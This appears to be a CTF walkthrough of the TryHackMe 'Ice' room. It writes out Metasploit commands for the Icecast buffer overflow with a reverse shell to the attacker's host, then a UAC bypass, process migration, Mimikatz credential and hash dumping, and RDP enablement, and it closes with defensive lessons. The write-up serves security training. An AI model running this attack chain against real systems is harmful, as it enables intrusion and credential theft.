---
title: "Ice"
description: "A Windows exploitation CTF machine focusing on the Icecast streaming media server vulnerability (CVE-2004-1561), UAC bypass, and credential dumping with Mimikatz."
difficulty: "Easy"
tags: ["Windows", "Icecast", "Metasploit", "UAC Bypass", "Mimikatz", "CVE-2004-1561"]
date: "2026-07-04"
---

![Ice room cover](/assets/screenshots/ice/cover.webp)

## Overview

Ice is a Windows-based TryHackMe room that demonstrates exploitation of a poorly secured media server. The target runs Icecast 2.0.1, an outdated streaming media server vulnerable to a buffer overflow (CVE-2004-1561). A Metasploit module provides the initial foothold as user `Dark`. Privilege escalation uses a UAC bypass to reach SYSTEM, followed by credential dumping with Mimikatz to recover passwords from memory.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** Windows exploitation, Icecast vulnerability, UAC bypass, process migration, Mimikatz credential dumping

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -Pn -oN nmap.txt <target-ip>
```

The scan revealed a Windows 7 Professional SP1 machine with numerous open ports:

| Port | Service | Version |
|------|---------|---------|
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS | Windows 7 Professional |
| 445/tcp | SMB | (not in local scan but common) |
| 3389/tcp | RDP | Microsoft Terminal Services |
| 5357/tcp | HTTP | Microsoft HTTPAPI httpd 2.0 |
| 8000/tcp | HTTP | Icecast streaming media server |
| 49152-49160/tcp | MSRPC | Microsoft Windows RPC |

![Nmap scan results](/assets/screenshots/ice/nmap1.webp)

Port 8000 immediately stood out — it was running Icecast, a streaming media server with known critical vulnerabilities.

![Service version detection](/assets/screenshots/ice/nmap2.webp)

The hostname was also identified as `Dark-PC` through SMB discovery.

### Icecast Service on Port 8000

Navigating to port 8000 in a browser revealed the Icecast web interface:

![Icecast web interface](/assets/screenshots/ice/icecast_page.webp)

Icecast 2.0.1 is vulnerable to CVE-2004-1561, a buffer overflow in the HTTP header parsing that allows unauthenticated remote code execution.

![CVE details for Icecast vulnerability](/assets/screenshots/ice/cve_details.webp)

## Exploitation — Icecast

### Metasploit Exploit

Started Metasploit and searched for the Icecast exploit:

```bash
msfconsole
search icecast
use exploit/windows/http/icecast_header
set RHOSTS <target-ip>
set RPORT 8000
set LHOST <attacker-ip>
exploit
```

The exploit sent a malformed HTTP request triggering a buffer overflow in Icecast's header parsing, resulting in a reverse Meterpreter shell:

![Metasploit Icecast exploit](/assets/screenshots/ice/msf_exploit.webp)

The session returned as user `Dark-PC\Dark`.

### Verifying Access

```meterpreter
getuid
```

Confirmed the initial foothold as an unprivileged user on the Windows 7 target.

## Privilege Escalation

### Local Exploit Suggester

Ran the local exploit suggester to identify privilege escalation vectors:

```bash
run post/multi/recon/local_exploit_suggester
```

![Local exploit suggester results](/assets/screenshots/ice/suggester.webp)

Several exploits were identified. The recommended path was `exploit/windows/local/bypassuac_eventvwr`, a UAC bypass that abuses the Windows Event Viewer (`eventvwr.exe`) auto-elevation behavior.

### UAC Bypass

Backgrounded the current session and loaded the UAC bypass module:

```bash
background
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST <attacker-ip>
set LPORT 5555
exploit
```

The exploit wrote a payload to the registry and triggered `eventvwr.exe`, which auto-elevates from a Standard user to an Administrative context under UAC. The payload executed and returned a new Meterpreter session.

![UAC bypass via Event Viewer](/assets/screenshots/ice/bypassuac.webp)

### Process Migration

The new session had administrative privileges but was still running in a user-level process. To interact with LSASS and dump credentials, needed to be in a SYSTEM-level process of the same architecture (x64):

```meterpreter
ps
```

The `spoolsv.exe` (print spooler) process was running as `NT AUTHORITY\SYSTEM`:

![Process list showing spoolsv.exe](/assets/screenshots/ice/ps_list.webp)

Migrated into it:

```meterpreter
migrate <PID>
```

![Privilege verification](/assets/screenshots/ice/getprivs.webp)

Confirmed SYSTEM privileges:

```meterpreter
getsystem
```

![SYSTEM access confirmed](/assets/screenshots/ice/getsystem.webp)

## Credential Dumping — Mimikatz

### Loading Kiwi

Loaded the Kiwi extension (Metasploit's Mimikatz implementation):

```meterpreter
load kiwi
```

![Loading Kiwi extension](/assets/screenshots/ice/load_kiwi.webp)

### Dumping Credentials

```meterpreter
creds_all
```

Mimikatz extracted plaintext credentials from the LSASS process memory. The password for user `Dark` was recovered:

![Mimikatz credential dump](/assets/screenshots/ice/creds_dump.webp)

**Password for Dark:** `Password01!`

### Hash Dump

Also dumped NTLM hashes for offline cracking or pass-the-hash attacks:

```meterpreter
hashdump
```

### Enabling RDP (Post-Exploitation)

With SYSTEM privileges, RDP could be enabled for full GUI access:

```meterpreter
run post/windows/manage/enable_rdp
```

Then connected via RDP:

```bash
xfreerdp /u:Dark /p:Password01! /v:<target-ip>
```

## Flags

After reaching SYSTEM, both user and root flags were accessible — the user flag on `Dark`'s desktop and the root flag in the Administrator's directory.

| Flag | Location |
|------|----------|
| User | `C:\Users\Dark\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

## Commands Used

```bash
nmap -sV -sC -Pn -oN nmap.txt <target-ip>
msfconsole
search icecast
use exploit/windows/http/icecast_header
set RHOSTS <target-ip>
set RPORT 8000
set LHOST <attacker-ip>
exploit
run post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
exploit
getprivs
ps
migrate <spoolsv-pid>
load kiwi
creds_all
hashdump
run post/windows/manage/enable_rdp
xfreerdp /u:Dark /p:Password01! /v:<target-ip>
```

## Lessons Learned

- **Legacy software is a critical risk.** Icecast 2.0.1 was released in 2004 and CVE-2004-1561 allows unauthenticated remote code execution. A 21-year-old vulnerability on a modern network is game over.
- **Windows 7 is end-of-life.** With no security updates, any vulnerability discovered after January 2020 remains unpatched. Defenders must ensure all systems are on supported operating systems.
- **UAC is not a security boundary.** User Account Control can be bypassed trivially when running as a local administrator. The `bypassuac_eventvwr` technique works because `eventvwr.exe` auto-elevates without prompting.
- **Mimikatz makes credential theft effortless.** Once SYSTEM access is obtained, LSASS memory can be dumped to recover plaintext passwords, NTLM hashes, and Kerberos tickets. No user needs to be logged in — a scheduled task running Icecast as `Dark` was enough to extract the password from memory.
- **Defense in depth must include AV and firewall.** Multiple walkthroughs noted that both Windows Defender and the Windows Firewall were disabled on this machine, making exploitation trivial and post-exploitation silent.
- **Process migration is essential on Windows.** Moving from a user-level process to a SYSTEM service like `spoolsv.exe` stabilizes the session and provides the necessary architecture and privilege level for credential dumping.

## References

- [TryHackMe — Ice](https://tryhackme.com/room/ice)
- [CVE-2004-1561 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2004-1561)
- [Icecast Header Overwrite (EDB 568)](https://www.exploit-db.com/exploits/568)
- [Mimikatz (Kiwi) — Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-kiwi.html)
- [GTFOBins — Windows](https://gtfobins.github.io/)
